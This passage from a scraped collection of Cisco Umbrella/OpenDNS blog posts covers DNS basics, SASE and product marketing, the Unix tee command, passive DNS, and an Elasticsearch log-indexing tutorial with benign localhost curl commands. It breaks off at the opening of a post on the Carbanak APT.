for a different blog post.) There are two types of DNS servers: authoritative and recursive . Authoritative nameservers are like the phone book company that publishes multiple phone books, one per region. Recursive DNS servers are like someone who uses a phone book to look up the number to contact a person or company. Keep in mind, these companies don’t actually decide what number belongs to which person or company — that’s the responsibility of domain name registrars. Let’s talk about the two different types in more detail. What is a recursive DNS server? When you type a website address into your browser address bar, it might seem like magic happens. In reality, the DNS system makes effortless internet browsing possible. First, your browser connects to a recursive DNS server . There are many thousands of recursive DNS servers in the world.  Many people use the recursive DNS servers managed by their Internet Service Provider (ISP) and never change them. If you’re a Cisco Umbrella customer, you’re using our recursive DNS servers instead. Once your computer connects to its assigned recursive DNS server, it asks the question “what’s the IP address assigned to that website name?” The recursive DNS server doesn’t have a copy of the phone book, but it does know where to find one. So it connects to another type of DNS server to continue the search. What is an authoritative DNS nameserver? The second type of DNS server holds a copy of the regional phone book that matches IP addresses with domain names. These are called authoritative DNS servers . Authoritative DNS nameservers are responsible for providing answers to recursive DNS nameservers about where specific websites can be found. These answers contain important information for each domain, like IP addresses. Like phone books, there are different authoritative DNS servers that cover different regions (a company, the local area, your country, etc.)  No matter what region it covers, an authoritative DNS server performs two important tasks. First, it stores lists of domain names and their associated IP addresses. Second, it responds to requests from a recursive DNS server (the person who needs to look up a number) about the correct IP address assigned to a domain name. After getting the answer, the recursive DNS server sends that information back to the computer (and browser) that requested it. The computer connects to the IP address, and the website loads, leading to a happy user who can go on with their day. Putting it all together This process happens so quickly that you don’t even notice it happening — unless, of course, something is broken. Let’s use a real world example. Imagine that you are sitting at your computer and you want to search for pictures of cats wearing bow ties (hey, we don’t judge). So you decide to visit Google to do a web search. First, you type www.google.com into your web browser. However, your computer doesn’t know the IP address of the server for www.google.com. So your computer starts by sending a query to its assigned recursive DNS nameserver. For this example, we’ll assume you’re one of our customers., So it’s a Cisco Umbrella server. Your computer asks the recursive DNS server to locate the IP address of www.google.com . The Cisco Umbrella recursive DNS nameserver is now assigned the task of finding the IP address of the website. Google is a popular website, so its result will probably be cached. But if the recursive DNS nameserver did not already have a DNS record for www.google.com cached in its system, it will need to ask for help from the authoritative DNS hierarchy to get the answer. This is more likely if you are going to a website that is newer or less popular. Each part of a domain like www.google.com has a specific authoritative DNS nameserver (or group of redundant authoritative nameservers). At the top of the server tree are the root domain nameservers. Every website address has an implied “.” at the end, even if we don’t type it in. This “.” designates the DNS root nameservers at the top of the DNS hierarchy. The root domain nameservers will know the IP addresses of the authoritative nameservers that handle DNS queries for the Top Level Domains (TLD) like “.com”, “.edu”, or “.gov”. The Umbrella recursive DNS server first asks the root domain nameserver for the IP address of the .com TLD server, since www.google.com is within the .com TLD. The root domain nameserver responds with the address of the TLD server. Next, the Umbrella recursive DNS server asks the TLD authoritative server where it can find the authoritative DNS server for www.google.com . The TLD authoritative server responds, and the process continues. The authoritative server for www.google.com is asked where to find www.google.com and the server responds with the answer. Once the Cisco Umbrella recursive DNS server knows the IP address for the website, it responds to your computer with the appropriate IP address. Your browser loads Google, and you can get started with more important business: finding pictures of cats in bow ties. Without DNS, the internet stops working The DNS system is so important to the modern world that we often refer to it as the foundation of the internet. If your recursive DNS service breaks for some reason, you won’t be able to connect to websites unless you type in the IP addresses directly — and who keeps an emergency list of IP addresses in their desk? If the recursive DNS service you use is working, but has been slowed down for some reason (like a cyberattack), then your connection to websites will be slowed down, too. Cisco Umbrella launched its recursive DNS service in 2006 (as OpenDNS) to provide everyone with reliable, safe, smart, and fast Internet connectivity. Umbrella has a highly resilient recursive DNS network. We’ve had 100% uptime with no DNS outages in our history. Our 30-plus worldwide data centers use anycast routing to send requests transparently to the fastest available data center with automatic failover. By configuring your network to use Umbrella’s recursive DNS service, you’ll get the fastest and most reliable connectivity you can imagine. But Umbrella provides much more than just plain old internet browsing. Learn more about how we make the internet a safer place for cats in bow ties in our post about DNS-layer security . Sign up for our free Cisco Umbrella Live Demo and see what a difference our recursive DNS service can make for your organization.", "date": "2020-06-16"},
{"website": "Cisco-Umbrella", "title": "Cisco Umbrella breaks new ground in SASE convergence", "author": ["Nada MacKinney"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-breaks-new-ground-in-sase-convergence", "abstract": "Exploding SaaS usage. Proliferating remote locations. Swelling ranks of roaming workers. It’s neither new nor surprising anymore. It’s the new normal. It’s business as usual. Ensuring security for this cloud-centered reality is paramount. Yet, how to achieve this goal isn’t business as usual. Traditional security models come up short. Success demands a new approach to networking and security. What’s in a name? What do we call this new approach? Lots of terms are circulating: secure internet gateway (SIG), edge security, elastic cloud gateway, secure access service edge (SASE), and more. Regardless of terminology, the core meaning is relatively consistent. There’s not much debate about that. Multiple security capabilities are converging into single, cloud-delivered solutions, and they are being joined with ­­edge-networking functions like SD-WAN. Gartner calls it secure access service edge (SASE) and describes it as “…an emerging offering combining comprehensive WAN capabilities with comprehensive network security functions (such as secure web gateway, firewall as a service, cloud access security broker, and more) to support the dynamic secure access needs of digital enterprises.” 1 And furthermore, “…demand for cloud-based SASE capabilities…will redefine enterprise network and network security architectures.” 1 At the forefront This isn’t new for Cisco. We have been advancing in this direction for years, leveraging our innovation leadership in networking and security to make real the approach that Gartner describes. And Cisco is forging ahead at a rapid clip. Case in point: Cisco’s recent announcement breaks new ground with a SASE solution that delivers a rich set of security functions from one cloud-native service and provides a unified SD-WAN and cloud security offer. Cisco’s announcement primes the pump in three major areas. Expanded security functionality in one cloud-native service Cisco Umbrella provides expansive security functionality and streamlined management via a single dashboard. Multiple security capabilities unified in one cloud service simply and flexibly secure direct-to-internet access, cloud app usage, and roaming users. It’s built on a microservices cloud architecture, where we disaggregate functions into components and re-envision them for scalability and reliability. On this agile, flexible, and function-rich foundation, Cisco is launching substantial new functions, including: SD-WAN + cloud security single offer : A new automated process for connecting Cisco SD-WAN + cloud security (Umbrella) speeds time-to-value by making security deployment and management simple across your SD-WAN Cloud-delivered firewall, layer 7 application visibility & control : Identify and block high risk, non-web applications / protocols (orderable summer 2020) Secure web gateway – AnyConnect integration : Enforce more granular web controls for remote workers using Umbrella’s secure web gateway Secure web gateway – granular app controls and file type blocking : Block specific actions such as uploads/posts/shares or block the download of specific file types Cloud-delivered firewall & secure web gateway – 250 to 500 Mbps tunnels :  Increased tunnel bandwidth for customers with high capacity requirements Cloud access security broker – SaaS app tenant restrictions : Only allow the use of specific instances of SaaS applications (i.e. block personal accounts) DNS Security – Android client support : Protect roaming Android mobile device users with DNS-layer security protection Cisco SecureX integration : Combine threat intelligence from Umbrella, other Cisco security solutions and third-party tools to speed threat detection and automate action to protect your environment And much more Simplified security for remote sites We are excited to unveil an industry-first — SD-WAN and cloud security in one offer. This greatly eases security deployment for remote locations with direct internet access. Automated provisioning and set-up makes a security rollout for remote locations simple, with fast deployment and easy management. “ The one-click integration of Cisco Umbrella with SD-WAN has been great. It makes deployment and configuration much easier in a distributed environment. This is a big step forward in simplifying the distribution and management of edge security. ” Joshua Mudd, senior network engineer, Presidio Here are some highlights of the Cisco SD-WAN and cloud security single offer: Hands-off automation : Deploy cloud security across thousands of branches in minutes Top notch protection : Defend against threats at the branch with the leader in security efficacy Simplified management : Simplify management with the Umbrella single pane of glass across all offices and users Deeper inspection & controls : Use secure web gateway and cloud-delivered firewall with IPSEC tunnels for greater inspection and control #1 in cybersecurity efficacy In exchange for the value of integration, sometimes we accept slightly less in individual elements. For example, a swiss army knife is a multi-function tool with a knife, screwdriver, scissors, and more. The knife isn’t the highest grade blade, but we accept this in exchange for many functions in one convenient tool. But, is there always a tradeoff? The answer is no! There’s no tradeoff with Cisco Umbrella. Cisco Umbrella provides expansive functionality in one cloud-native service and the industry’s highest cybersecurity efficacy at the same time. Lots of network security providers claim they are the best at threat detection and prevention, but can they prove it? New research from AV-TEST , the 2020 DNS-Layer Protection and Secure Web Gateway Security Efficacy report , reveals that Cisco Umbrella is the industry leader in security efficacy. When it comes to rating the effectiveness of security solutions, efficacy is king. The more malicious activity you can block, the less chance there is for a damaging breach to take place. Stride with confidence toward SASE Cloud adoption is a given, yet one can’t predict its trajectory in any specific organization. Will a new company strategy or new leader dramatically alter SaaS strategy? Will remote locations proliferate overnight with an acquisition? Will the number of roaming workers balloon overnight as has happened lately in many organizations? Cisco enables you to adapt with confidence to whatever the future holds. With its extensive portfolio of security, networking, and access technology, Cisco is best positioned to help you connect users globally with a secure, cloud-native network architecture. For more information on these announcements and Cisco’s SASE strategy: Join the Cisco Umbrella June 2020 launch webinar Read the blog post, Cisco is Building a Bridge to Secure Access Service Edge See presentations, demos and more about Cisco Umbrella at Cisco Live 1 Gartner, The Future of Network Security is in the Cloud: 30 August 2019; Lawerence Orans, Joe Skorupa, Neil MacDonald.", "date": "2020-06-23"},
{"website": "Cisco-Umbrella", "title": "7 ways to take cybersecurity to new levels", "author": ["Ken Howard"], "link": "https://umbrella.cisco.com/blog/7-ways-to-take-cybersecurity-to-new-levels", "abstract": "The average company uses more than 70 cybersecurity technologies 1 , which makes managing a multi-vendor environment challenging. Even with vendor consolidation becoming a growing trend, organizations can still struggle to make sense of what is happening in their environments. Like the blind men around an elephant, each of those technologies brings with them their own alerts and analyses of the potential cyber threats to your security operations. But the picture is incomplete. The reality is that your team doesn’t need any more alarm bells. They need the context behind each alert, so they can better prioritize, understand, and remediate issues. This is about extracting more insight from the cybersecurity tools already at hand. It’s about enabling your devices, cloud services, and network infrastructure to share data and enforce policies regardless of location. It’s about really understanding what is going on so that you can make decisions that are appropriate and timely. Cisco is committed to sharing and strengthening contextual intelligence across our customers’ security stacks. With bi-directional APIs, programmatic sharing of contextual threat intelligence, and anycast routing technologies, we’ve made it easier to get the most out of your security infrastructure quickly and efficiently. Here are seven things you can do with Cisco Umbrella to extend your cybersecurity abilities: 1. Take security off-premises and beyond the perimeter Leverage the bi-directional APIs of Cisco Umbrella DNS-layer security to secure devices and sites beyond your perimeter. Programmatically convert local threat detection and intelligence from your existing systems into global threat prevention to protect your infrastructure and assets wherever they are. 2. Tap into an ecosystem of security for your networks and devices Embrace the principles of integration, intelligence, and automation to benefit from a portfolio of solutions that work together. This integrated portfolio helps you enforce policies, protect and control cloud apps, and keep your network and endpoints safe from threats. 3. Make better decisions faster with contextual intelligence More complete insights don’t come from one source. Data needs to flow from a 360-degree view of your environment. Cisco Umbrella employs a bi-directional approach that leverages not only threat intelligence from the global Umbrella security network, but also collects insights from across your networks and devices. This back-and-forth knowledge enriches security events with threat intelligence about the domains, IPs, and file hashes used in attacks, helping to pinpoint attackers’ infrastructures, and predict future threats. 4. Take advantage of superior threat intelligence effectiveness Cisco Umbrella’s threat intelligence uncovers and blocks a broad spectrum of malicious domains, IPs, URLs, and files. Umbrella uses threat data from Cisco Talos, one of the largest threat intelligence teams in the world. This scale, combined with data from statistical and machine learning models, makes Umbrella’s threat intelligence one of the most effective sources for anti-virus blocking in the world. 2 5. Quickly and easily protect guest Wi-Fi Cisco Umbrella extends your protection to guests by enforcing network security and content filtering at the DNS layer. Umbrella uses anycast routing technology, which means you need to deal with only one IP address for your entire enterprise — making it easy to secure guest Wi-Fi in a few steps. 6. Get effective security without added latency Umbrella’s DNS-layer security uses anycast routing in which every data center announces the same IP address, so requests are transparently sent to the fastest available with automated failover. This allows us to route traffic to the fastest server at the time, for the shortest path for every connection. Further, peering relationships provide shortcuts between networks, which enables us to resolve requests faster — and boost internet speed. 7. Get resiliency you can count on Cisco Umbrella’s anycast routing infrastructure not only means speed. It also delivers a global, self-healing network that can handle infrastructure disruptions — natural disasters, equipment failure, or maintenance — without passing on the disruption to you. Cisco Umbrella is dedicated to helping you do more with your security infrastructure so that your organization, regardless of size, can focus on the business at hand. Learn more by downloading this free eBook, “ 7 Ways to Take Cybersecurity to New Levels .” 1 Cisco 2020 CISO Benchmark Report, https://www.cisco.com/c/en/us/products/security/ciso-benchmark-report-2020.html . 2 AV-Test: DNS-Layer Protection and Secure Web Gateway Security Efficacy Results, Dec. 2019 .", "date": "2020-06-30"},
{"website": "Cisco-Umbrella", "title": "Answering Your Big Questions on Big Data", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/answering-your-big-questions-on-big-data", "abstract": "Unless you’ve been living under a rock for the last ten years, you have heard the term “big data.” Do you know what it means? If you’re like most people, you probably answered something to the effect of “kinda.” Well, let’s clear a few things up. This image (above) was created using the 3D visualization tool developed by the OpenDNS Security Labs. Visualization is an increasingly important component of the big data security techniques OpenDNS uses to predict, detect and protect against the most complex and sophisticated attacks. What’s the big deal with big data? Companies of all types are adopting big data practices to improve their operational efficiency and better understand their customers’ needs and wants. Businesses properly leveraging big data see higher productivity and profits than their counterparts. The power of big data is no fallacy, and the trend has gone mainstream. In fact, 70% of enterprise organizations have either deployed or are planning to deploy big data-related projects and programs, according to the 2014 IDG Enterprise Big Data Research report. What is big data? It can be difficult to decipher the meaning of big data amidst the buzzwords and marketing speak. Big data is definitely big, but it is also misnamed, as Tom Davenport mentions in his new book, Big Data at Work: Dispelling the Myths, Uncovering the Opportunities . Big Data means different things to different people, but it can be generally defined as the following: Data that is too large, unstructured and/or rapidly changing to store and analyze using traditional database management and analysis tools. To better understand big data, the core characteristics are often referred to as the four V’s of big data: volume (size), velocity (speed of change), variety (lack of structure) and veracity (trustworthiness). Many have recently been adding a fifth V, value , to highlight the importance of obtaining value from the data. Is bigger better? With over 90% of all the data in the world having been generated in the last 2.5 years , there is no denying that big data is getting bigger. As our digital footprint rapidly increases, it is easy to get caught up in the quest to capture more and more data. While more data is often beneficial, in most cases additional data collection isn’t where organizations should be focusing their efforts. Prior to wanting more, ensure that you are making the best use of existing data. Are you successfully obtaining value from the data you already have? The value of your data does not lie in its volume – it lies in the use and reuse of it. So before making your big data even bigger, structure your existing data, analyze it, and ensure that you obtain value from it. Remember, your data is only as good as the insights you glean from it. What is the biggest risk related to the adoption of big data? Big data initiatives are costly. It is easy to become overwhelmed by the search for the right tools. The biggest threat that organizations face as they look to leverage big data lies in its general use and application. Companies need to spend more time thinking through the application of the data that is collected and analyzed. The majority of big data initiatives begin seeing their full ROI after 18 months. Preparation is key. What is the “next big thing” in big data? Many view real-time big data analytics as the next big thing. I disagree. I believe there is something much bigger. The ‘next big thing’ in big data is something that makes it easier to uncover the ‘the next big thing’. This involves getting answers to questions that would otherwise go unasked. Current big data analysis is too dependent on human intuition and initiation. As Gurjeet Singh, Co-Founder and CEO of Ayasdi, states in his Fast Company article , “Every Big Data exploration starts with human assumptions and biases that amount to an educated guess in the form of a query … with more larger and complex datasets, it is simply too difficult for the brain to make the connections that lead to making the optimal query.” I believe Gurjeet is spot on, and I let him know that . There is too much reliance on asking the right questions. Automating the discovery of insight through advances in data-led discovery is the next big thing in big data. This will empower businesses to better attack big data analytics from both ends, targeted high-value questions and data-led discovery. Some of the biggest problems have solutions that are buried in data. This breakthrough in big data technology will allow us to begin finding valuable answers to questions we didn’t know to ask in the first place.", "date": "2014-03-20"},
{"website": "Cisco-Umbrella", "title": "The (Very Short) Tale of Unix's Tee Command", "author": ["Michael Merritt"], "link": "https://umbrella.cisco.com/blog/the-very-short-tale-of-unixs-tee-command", "abstract": "“Tee”-ing Off In Unix, the Tee command is used to ‘T’, or split, the output of a stream into two identical streams. This can be useful for many things, such as writing to a file while also writing to stdout : $whoami | tee /tmp/file\n ubuntu This left us with a file that we can later use: $cat /tmp/file\n ubuntu Tee can also be used to debug a string of piped commands when you don’t want to disrupt the pipe: cat console.log | grep 'config' | tee /tmp/file | sort -n | uniq -c Now you can cat/tmp/file and see what was happening between grep and sort. And Now For a Short Story One day at the OpenDNS office, we notice that our Jenkins CI build server was reporting all builds as success — even though they were actually failing! If you’re new to Tee, it might not be immediately apparent what went wrong: ./build.sh | tee console.log The problem here is that the pipe to Tee replaces the exit code of the command with that of Tee. Tee always exits 0 — it always successes. So, in order to catch the failure you can use PIPESTATUS in bash: ./build.sh  | tee console.log; test ${PIPESTATUS[0]} -eq 0 Since we are calling index[0] of PIPESTATUS, this will give us the exit code of our build.sh script. Be aware that when using multiple pipes,  you’ll need to check the status of each one to determine which pipe failed. Finally, we’re using the command test -eq 0 to compare equality between the PIPESTATUS exit code and zero — if true, then that means our build script exited successfully this time. If there are multiple commands happening and you’re still not getting the exit code you expect, then it might make sense to wrap everything in a bash script and use set -e, which will force the script to exit upon an non-zero exit code. Just remember that set -e has some gotchas, and it’s probably better to use a trap to catch the signal and exit appropriately.", "date": "2015-10-06"},
{"website": "Cisco-Umbrella", "title": "New Passive DNS Enhancements for Cisco Umbrella Investigate", "author": ["Jennifer Liou"], "link": "https://umbrella.cisco.com/blog/new-passive-dns-enhancements-for-cisco-umbrella-investigate", "abstract": "It’s no secret that security professionals today face mounting challenges trying to keep up with sophisticated attackers. Whether it’s responding to a single, isolated incident, or researching a long-running, complex threat scenario, security teams require historical data from within and outside of their organizations in order to properly triage and provide data points to justify their actions. When it comes to evaluating domains, security analysts need more history about a domain: DNS record changes, yes, but also the evolution of goodness or badness of the domain over time. For example, consider two domains that are very similar to each other – hosted in the same IP space, with similar unique requesting clients and request patterns. Both are benign today but one has skeletons in its closet; it has a history of being tagged with security events such as malware. As a security specialist responsible for securing your organization, you’d be more interested in this second domain, no? And of course you would not want to miss out on this rich historical data as you triage. Another frustrating challenge for security analysts is dealing with retroactive investigations. Indicators of Compromise (IOCs) can be published long after an actual compromise took place. Often attackers will wait until the time is right to utilize infrastructure they’ve prepared for an attack, sometimes keeping domains dormant for years. You want to be able to inspect suspicious domains and IPs but you certainly do not want to tip off or alert bad actors that they are under suspicion. This could cause them to evade you by ditching the infrastructure they had been standing up. So how can we help your SOC respond faster to threats? We believe security systems should empower your people to investigate and respond to threats faster. Cisco Umbrella Investigate gives analysts real-time access to all of our threat intelligence about domains, IPs and malware across the internet. Security analysts love Investigate because it enables them to: Better prioritize incident investigations Speed up incident investigations and response Easily integrate Investigate data other security orchestration tools Investigate is available via a web console or an API. Introducing enhanced Passive DNS We are delighted to announce our new and improved Passive DNS (pDNS) capability. Rich pDNS context helps Incident Responders investigate observables by providing a quick summary of past key events and security categorizations for domains and IPs. Our pDNS intelligence empowers Threat Hunters to get better visibility into critical historical events and relationships resulting in faster triage and more effective investigations. There are several factors that make Cisco Umbrella Investigate’s Passive DNS feature unique. First, it’s the massive volume of our pDNS database – it is the largest in the world. Umbrella resolvers analyze over 180 billion DNS requests daily. This unique view of the internet enables researchers to better identify trends on threats, faster. In addition, we do not just share traditional pDNS (DNS record change snapshots over time), we go beyond that and also display the security categorization data over time. This is useful for identifying not only which domains are categorized as malicious today but also for gaining a more comprehensive understanding of a domain’s history. For example, a domain could be benign one day, compromised, and some time later, remediated. Without, pDNS you would not be able to get this full context. For example, upon first glance, this domain appears to be benign: The domain currently has no security categories tagged to it (as of the publishing date of this blog). However, Incident Responders or Threat Hunters would find it interesting that the domain is shown to have a history: Detail inspection panels on Passive DNS Timeline It was tagged in Feb 2017 as a domain used by malware called Pony (above left). We are further able to see that the domain tag was removed (above center) two years later, in Feb 2019, followed by an A record change (above right) a few days later.  Incident Responders and Security Analysts may or may decide not to permit traffic to this domain depending on the risk tolerance unique to their organizations, but having this additional context at their fingertips help these teams make better informed decisions. Other concerning scenarios include BGP hijacking – monitoring for certain DNS record changes can help prevent or speed up detection and response when certain records change to unexpected values. Also, domain convictions can vary in terms of speed to convict; even the best human analyst cannot convict with consistently high accuracy at nearly the same scale as a machine algorithm can. By capturing up to four years of historical data, Investigate’s pDNS is much more than a traditional passive DNS database. By leveraging Investigate’s rich domain conviction historical data, you can uncover even more salient security events  impacting your business, faster. Learn more Interested in checking out our Passive DNS capability? Contact us today for a demo or free trial for Cisco Umbrella Investigate. If you are currently an Investigate customer, you already have access to our enhanced Passive DNS today. You will get up to 16x more pDNS historical data with no required action. Cisco Threat Response users who have an Investigate API license will be able to view pDNS data directly in the Threat Response dashboard.", "date": "2019-07-08"},
{"website": "Cisco-Umbrella", "title": "Elasticsearch: You Know, For Logs", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/elasticsearch-you-know-for-logs", "abstract": "The data platform team at OpenDNS is always looking at new technologies to improve our real time search platform. Consequently, we have been keeping a close eye on Elasticsearch for quite a while, and even use it for some internal tools and metrics. OpenDNS is now looking at using Elasticsearch as a real time search engine for our DNS log data. OpenDNS needs a powerful real time logging and search platform for several reasons. First and foremost is for our customers. Our customers need to be able to identify malicious activity on their networks as it is happening so they can respond promptly. Any time spent waiting for the data to come in is time that infections could be spreading or attacks could be gaining momentum. Similarly, we at OpenDNS use this data to monitor our own systems using several different metrics. If something goes wrong, we need to know right away so we can fix the problem before it propagates. Overall, getting data in real time means that the people monitoring this data can react in real time. This reaction time could mean the difference between a minor headache and a catastrophic problem. For Elasticsearch to solve this problem, it not only has to be real-time, but scalable and manageable as well. OpenDNS is growing quickly, so we need a system that can grow with us without introducing technical debt. Also, our engineers don’t like getting paged on Sunday at 3 a.m., so we need a system that can deal with failures automatically without missing a beat. Part 1: Introduction and Setup This blog post is the first in a series that will focus on Elasticsearch and how to optimize it for log data. For information on other Elasticsearch products, including their recommended real time logging stack “ELK,” vist https://www.elastic.co/products . Furthermore, this series will mainly show examples using Elasticsearch’s REST API, because it is simple and easy to use. With that said, Elasticsearch supports several client languages, listed here . What is Elasticsearch? Elasticsearch is a highly scalable search platform based on Apache Lucene. It is built from the ground up for the cloud and supports distributed indices and multitenancy. Since its release in 2010, Elasticsearch has gained many notable users and remains a very active project at Elastic under its creator Shay Banon. Getting started with Elasticsearch The Elasticsearch website has great documentation to walk users through installation. Elasticsearch was designed to be distributed, so to demonstrate its full functionality it is important to set up a cluster of at least three nodes. Creating a three node cluster should be as simple as running three Elasticsearch instances with the same cluster name. The “cluster.name” variable is found in the main Elasticsearch configuration file “elasticsearch.yml” in the “config” folder. By default a three-node cluster will include two data nodes along with one elected master node. Once Elasticsearch is installed and the cluster is connected, users need a way of visualizing their cluster. Elasticsearch supports a plugin called “Head” that will to exactly this, plus a little extra. To install Head simply run this command from the ‘elasticsearch’ folder: bin/plugin --install mobz/elasticsearch-head Once installed, it can be accessed through http://<hostname>:9200/_plugin/head/ Head gives an intuitive view of the indices and shards of an Elasticsearch cluster as well as the ability to easily browse and search through its documents. When head is first opened, it should look something like the following: This image shows a simple Elasticsearch cluster with three nodes: two data nodes indicated by the black circles and one master, indicated by the black star. On the right is an index named “dns-test-1.” Each green box represents a “Shard,” which are Lucene Inverted Indices under the hood. By default an Elasticsearch index has five shards, each with one replica. Primary shards are shown with emboldened borders and replicas are shown with light borders. Elasticsearch is designed to work straight out of the box, no need to worry about schemas or creating indices yet. As long as each document is given a type and an index name, it will index the document. Example: curl -XPOST 'http://localhost:9200/logs/log' -d '{\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\n    \"URL\" : \"opendns.com\",\n    \"IP Address\" : \"127.0.0.1\", \"log_id\" : 1\n}' Sending a simple index request will automatically create an index called “logs” and index the given document. Elasticsearch will also automatically guess the type of each field and index the doc. Elasticsearch is pretty smart. If formatted properly the “Timestamp” field will default to the “date” data type and the “log_id” field will default to type “int.” Though trickier fields such as “IP Address”  will default to just a string, even though Elasticsearch does have a native “IP” data type. The documents themselves are indexed and stored in JSON format. Note that once the data type for a field is set, it cannot be changed. For example if the following document: curl -XPOST 'http://localhost:9200/logs/log' -d '{\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\n    \"URL\" : \"opendns.com/enterprise-security\",\n    \"IP Address\" : \"127.0.0.1\", \"log_id\" : \"abcd\" }' is indexed after the previous one, the following exception is thrown: RemoteTransportException[[Reptyl][inet[/10.70.99.146:9301]][indices:data/write/index]]; nested: MapperParsingException[failed to parse [log_id]]; nested: NumberFormatException[For input string: \"abcd\"]; Mappings After an initial cluster is set up, an important step is to create a type mapping for the documents being indexed. The data type and other settings of each field for a specific document type are all stored in a type mapping which is configured using the Elasticsearch Put Mapping APl . Although a default mapping will be created by Elasticsearch when a new document is indexed, the default data types are often too general. For example, any field containing only an integer will be defaulted to type “long.” In this case, manually setting it to type “integer” might better represent the data and simultaneously save some storage space. Also, any “string” fields need to be set to “not analyzed.” By default Elasticsearch will tokenize all string fields with an analyzer. This functionality is mainly implemented to support full text search and document scoring. For log data in general, queries are match only, so none of this is important. Setting the “index” field to “not_analyzed” ensures Elasticsearch won’t waste time unnecessarily tokenizing every string field. Before creating a mapping, any default mapping created by Elasticsearch should be deleted in order to avoid conflicts. This will also delete any documents that have been indexed into this default mapping, so be careful. Mappings are deleted with the following command: curl -XDELETE 'http://localhost:9200 /logs/log/_mapping' Here is an example of a put mapping command that specifies a simple mapping  for documents with type “log” belonging to the index “logs” with three fields and their datatypes: $ curl -XPUT 'http://localhost:9200/logs/_mapping/ log ' -d '\n{\n    \"log\" : {\n        \"properties\" : { \"Timestamp\" : {\"type\" : \"date\"},\n           \"URL\" : {\"type\" : \"string\",\n                      \"index\": \"not_analyzed\"},\n           \"IP Address\" : {\"type\": \"ip\"},\n           \"log_id\" : {\"type\" : \"integer\"} }\n    }\n}' Once a mapping is set, it is important to note that indexing documents matching the mapping type, but with fields not included in the mapping will add said fields to the mapping. For example, if, after applying the previous mapping, I tried to submit the following index request: curl -XPOST 'http://localhost:9200/logs/log' -d '{\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\n    \"URL\" : \"opendns.com/enterprise-security\",\n    \"IP Address\" : \"127.0.0.1\"\n   \"log_id\" : \"2\", \"user\" : \"John\" }' The “user” field with type “string” would be added to the mapping automatically. Document IDs If unspecified, Elasticsearch will simply generate an ID for each document. This works fine in some cases, but often the user needs to be able to add their own ids. In the most simple case, a document ID can be added to an index request itself as in the following: curl -XPUT 'http://localhost:9200/logs/log/37' -d '{\n    \"Timestamp\" : \"2009-11-15T14:12:12\",\n    \"URL\" : \"opendns.com/enterprise-security\",\n    \"IP Address\" : \"127.0.0.1\"\n}' Simply change the request to “XPUT” and tack on the ID to the end of the URL. Alternatively, a field can be added to the mapping along with a specified path to pull the ID from the document itself. The following mapping will tell Elasticsearch to use the “log_id” field as the document ID: $ curl -XPUT 'http://localhost:9200/logs/_mapping/log' -d '\n{\n   \"log\" : { \"_id\" : {\"path\" : \"log_id\"}, \"properties\" : {\n               \"Timestamp\" : {\"type\" : \"date\"},\n               \"URL\" : {\"type\" : \"string\",\n                           \"index\": \"not_analyzed\"},\n               \"IP Address\" : {\"type\": \"ip\"}, \"log_id\" : {\"type\" : \"integer\"} }\n    }\n}' Index Schema and Templates With a large amount of data coming in every day, it is important to have a comprehensive way of partitioning the data into Elasticsearch. For log data, it is often intuitive to partition the data into indices based on a time interval such as daily or hourly. Partitioning data in this way comes with several advantages. For one, data expiration becomes very easy. Instead of relying on a TTL or other expiration methods, old indices can simply be deleted altogether. Another advantage comes when the data is queried. If a query is only looking for documents from a certain time period, it can be limited to fewer indices instead of having to query an entire cluster. This index schema is especially advantageous in the real time search use case. Since the most recent index will likely be receiving the majority of the traffic, Elasticsearch will maintain a larger cache for this index, improving performance. This process of creating indices, along with settings and mappings, can be automated in Elasticsearch by using an “Index Template.” The job of an index template is to automatically apply mappings and other settings to an index at the time it is created. A basic index template will contain: a mapping for each type to be indexed, the name or wildcard expression matching the indices to which the template should be applied, and the number of shards and replicas each index should contain. All you have to do is index a document with an index name that matches one of your templates and the index will be automatically created using the template (assuming the index doesn’t already exist). For example, if indexing DNS logs by the day the index naming schema might look something like “dnslog-YYYY-MM-DD,” with each subsequent index name incremented by one day. It would be too much work to apply settings and mapping to each index individually. Templates can be applied to every index matching this schema by creating a template first with a wildcard in the “template” field. For example an index template that would be applied to every “dnslog-YYYY-MM-DD” index would look something like: curl -XPUT localhost:9200/_template/dns_template -d '\n{ \"template\" : \"dnslog-*\", \"settings\" : {\n        \"number_of_shards\" : 3,\n       \"number_of_replicas\": 1\n    },\n    \"mappings\" : {\n        \"log\" : {\n            \"properties\" : {\n               \"Timestamp\" : {\"type\" : \"date\"},\n               \"URL\" : {\"type\" : \"string\",\n                           \"index\": \"not_analyzed\"},\n               \"IP Address\" : {\"type\": \"ip\"}\n            }\n        }\n    }\n}\n' Once this template has been applied, creating a new index with mapping and settings already applied is as simple as sending an index request. Example: curl -XPOST 'http://localhost:9200/ dnslog-2015-04-09 /log' -d '{\n    \"Timestamp\" : \"2015-04-09T14:12:12\",\n    \"URL\" : \"opendns.com/enterprise-security\",\n    \"IP Address\" : \"127.0.0.1\"\n}' After applying the previous template the command above will create the index “dnslog-2015-04-09” containing three shards with one replica and the “log” mapping already applied. Conclusion In this first post of our series, Elasticsearch has shown that it is flexible enough to be set up for log data using properly configured Index Templates and Type Mappings. In the next post in our series, we will explore the scalability and availability of Elasticsearch. For more information on Elasticsearch, check out their website at http://www.elastic.co . Continue to: Elasticsearch: You Know, For Logs [Part 2] .", "date": "2015-05-05"},
{"website": "Cisco-Umbrella", "title": "Utilizing NLP To Detect APT in DNS", "author": ["Jeremiah O'Connor"], "link": "https://umbrella.cisco.com/blog/nlp-apt-dns", "abstract": "Imagine that after a nice, relaxing long weekend, you come in to work Monday morning at your job at the bank. While waking up with a cup of coffee, you begin checking email. Among the usual messages, there’s a message about a security update and you click it. Security updates are so common these days that it’s normal to get another email about one. What you don’t know is that your system has just been infected, starting off a long chain of events behind one of the biggest thefts in cyber history. This scenario is similar to how the first successful, large-scale computer bank robbery was launched in January 2013, by a group labeled Carbanak. First mentioned in a recent Kaspersky report, the Carbanak group launched a series of cyber-espionage attacks targeting banks and financial institutions for at least two years. Prior to this report, in December, 2014, Fox-IT Security published information on what may have been a precursor to these attacks about a banking Trojan called Anunak. These attacks resulted in a loss of over one billion dollars across a number of banks from countries such as Ukraine, China, Russia, U.S., and Germany. In the attacks, the malicious actors gained entry to an employee’s computer by utilizing spear phishing techniques to install a backdoor, granting them remote access to the system in order to exfiltrate data. They were then able to move 